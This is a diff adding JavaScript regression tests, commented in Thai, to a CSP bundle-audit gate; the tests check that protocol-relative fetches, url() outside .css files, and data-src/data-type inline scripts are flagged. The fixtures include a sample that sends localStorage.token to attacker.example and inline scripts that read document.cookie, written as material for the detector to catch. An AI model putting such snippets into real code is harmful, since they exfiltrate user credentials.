@@ -559,3 +559,77 @@ test('ตัวเลขจำนวนเทสในเอกสารต้�
     `docs/frontend-security-headers.md เขียนว่า ${claimed[1]} เทส แต่ไฟล์นี้มีจริง ${actual} เทส`
   );
 });
+
+// ── รอบรีวิว PR (2026-08-20, comment #5357040475) ──────────────────────────
+// สามข้อล้วนเป็น false clean: gate ตอบ PASS บนของที่ policy จะบล็อกจริง
+// ทุกตัวยืนยันแล้วว่าแดงบนโค้ดก่อนแก้ ด้วยการรัน CLI กับ fixture จริง
+
+test('URL แบบ protocol-relative ที่ถูก fetch ต้องถูกจับ (review #1)', () => {
+  // `//host/x` ไม่ใช่ relative path — browser เติม scheme ของหน้าเว็บแล้วยิงข้าม origin จริง
+  // เงื่อนไขเดิม `!/^https?:\/\//` ตัดทิ้งเพราะเข้าใจว่าเป็น relative และกฎรวมก็บังคับ scheme
+  // เหมือนกัน จึงไม่มีกฎไหนครอบเลย = ช่องที่กว้างที่สุดของ gate นี้
+  const { dir, cleanup } = makeDist({
+    ...cleanFiles,
+    'assets/exfil.js': 'const s=localStorage.token;fetch("//attacker.example/exfil?d="+s);',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    const hit = findings.find((f) => /attacker\.example/.test(f.detail));
+    assert.ok(hit, JSON.stringify(findings));
+    assert.equal(hit.directive, 'connect-src');
+  } finally {
+    cleanup();
+  }
+});
+
+test('url() แบบ protocol-relative ต้องถูกจับนอกไฟล์ .css ด้วย (review #2)', () => {
+  // กฎ R1 ในไฟล์เดียวกันยึดหลักว่า "ผูกกับรูปทรงของ markup ไม่ใช่ชนิดไฟล์" เพราะบทเรียน C2
+  // แต่ url() กลับถูกผูกกับนามสกุล .css — `<style>` ใน HTML และ CSS-in-JS จึงหลุด
+  const { dir, cleanup } = makeDist({
+    'index.html': '<!doctype html><html><head><style>.h{background:url(//cdn.example.com/bg.png)}</style></head><body></body></html>',
+    'assets/styled.js': 'const css=".x{background:url(//cdn2.example.com/y.png)}";inject(css);',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    assert.ok(findings.some((f) => /cdn\.example\.com/.test(f.detail)), `<style> ใน HTML: ${JSON.stringify(findings)}`);
+    assert.ok(findings.some((f) => /cdn2\.example\.com/.test(f.detail)), `CSS-in-JS: ${JSON.stringify(findings)}`);
+  } finally {
+    cleanup();
+  }
+});
+
+test('data-src / data-type ต้องไม่ทำให้ inline script รอดการตรวจ (review #3)', () => {
+  // `\b` ถือว่า `-` เป็นขอบเขตของคำ `\bsrc\s*=` จึงจับ `data-src=` เป็น "แท็กนี้มี src"
+  // ส่วน type regex เดิมไม่มี `\b` เลย · `data-src` เป็นสำนวนของ deferred-script loader
+  // ที่ใช้จริง (เช่น Rocket Loader) ไม่ใช่เคสสมมติ
+  const { dir, cleanup } = makeDist({
+    'index.html': '<!doctype html><html><body><script data-src="x">alert(document.cookie)</script></body></html>',
+    'other.html': '<!doctype html><html><body><script data-type="application/json">alert(document.cookie)</script></body></html>',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    const inline = findings.filter((f) => f.rule === 'inline-script');
+    assert.equal(inline.length, 2, `ต้องจับทั้งสองไฟล์: ${JSON.stringify(findings)}`);
+  } finally {
+    cleanup();
+  }
+});
+
+test('src และ type ของจริงต้องยังทำให้ข้ามได้ตามเดิม (กันแก้เกิน)', () => {
+  // คู่ตรงข้ามของเทสบน — แท็กที่มี src จริงคือ external script ที่ script-src 'self' อนุญาต
+  // และ type ที่ browser ไม่ execute คือ data block ไม่ใช่โค้ด
+  const { dir, cleanup } = makeDist({
+    'index.html':
+      '<!doctype html><html><head><script type="module" crossorigin src="/assets/index-abc.js"></script>' +
+      '<script type="application/json">{"a":1}</script>' +
+      '<script type="application/ld+json">{"@context":"x"}</script>' +
+      '<script type="application/json; charset=utf-8">{"b":2}</script></head><body></body></html>',
+    'assets/index-abc.js': 'const a=1;export{a};',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    assert.deepEqual(findings, [], JSON.stringify(findings));
+  } finally {
+    cleanup();
+  }
+});
